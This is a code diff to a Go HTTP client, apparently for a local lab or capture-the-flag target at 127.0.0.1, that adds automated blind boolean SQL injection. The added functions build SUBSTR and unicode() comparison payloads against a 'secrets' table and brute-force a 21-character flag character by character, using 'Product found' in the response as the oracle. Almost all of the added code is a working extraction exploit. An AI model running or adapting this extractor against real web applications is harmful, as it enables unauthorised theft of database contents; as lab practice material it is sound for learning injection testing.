@@ -12,6 +12,20 @@ import (
 	"time"
 )
 
+const (
+	Lowercase = "abcdefghijklmnopqrstuvwxyz"
+	Uppercase = "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+	Digits    = "0123456789"
+	Symbols   = "{}_-"
+
+	DefaultCharset = Lowercase + Uppercase + Digits + Symbols
+)
+
+const (
+	ASCIIMin = 32
+	ASCIIMax = 126
+)
+
 type HTTPClient struct {
 	BaseURL string
 	Client  *http.Client
@@ -117,6 +131,69 @@ func bodyContainsOracle(obs Observation, marker string) bool {
 	return strings.Contains(obs.Body, marker)
 }
 
+func buildCharEqualsPayload(position int, ch rune) string {
+	return fmt.Sprintf(
+		"1' AND SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1)='%c'-- -",
+		position,
+		ch,
+	)
+}
+
+func buildASCIIEqualsPayload(position int, code int) string {
+	return fmt.Sprintf(
+		"1' AND unicode(SUBSTR((SELECT value FROM secrets LIMIT 1),%d,1))=%d-- -",
+		position,
+		code,
+	)
+}
+
+func (c *HTTPClient) extractingPayloadByCharset() string {
+	flagLength := 21
+	var result string
+
+	for i := 1; i <= flagLength; i++ {
+		for _, ch := range DefaultCharset {
+			payload := buildCharEqualsPayload(i, ch)
+			obs, err := c.SendPayload(payload)
+			if err != nil {
+				fmt.Fprintln(os.Stderr, err)
+				continue
+			}
+
+			ok := bodyContainsOracle(obs, "Product found")
+			if ok {
+				result += string(ch)
+				break
+			}
+		}
+	}
+	return result
+}
+
+func (c *HTTPClient) extractingPayloadByASCII() string {
+	flagLength := 21
+	var result string
+
+	for i := 1; i <= flagLength; i++ {
+
+		for j := ASCIIMin; j <= ASCIIMax; j++ {
+			payload := buildASCIIEqualsPayload(i, j)
+			obs, err := c.SendPayload(payload)
+			if err != nil {
+				fmt.Fprintln(os.Stderr, err)
+				continue
+			}
+
+			ok := bodyContainsOracle(obs, "Product found")
+			if ok {
+				result += string(j)
+				break
+			}
+		}
+	}
+	return result
+}
+
 func main() {
 	client, err := NewHTTPClient("http://127.0.0.1:5003/boolean", 5*time.Second)
 	if err != nil {
@@ -138,10 +215,11 @@ func main() {
 
 		ok := bodyContainsOracle(result, "Product found")
 
-		fmt.Println("Payload:", payload)
-		fmt.Println("Status:", result.Status)
-		fmt.Println("Body:", result.Body)
+		printResult(result)
 		fmt.Println("Oracle:", ok)
 		fmt.Println()
 	}
+
+	fmt.Println("Charset extracting flag:", client.extractingPayloadByCharset())
+	fmt.Println("ASCII extracting flag:", client.extractingPayloadByASCII())
 }
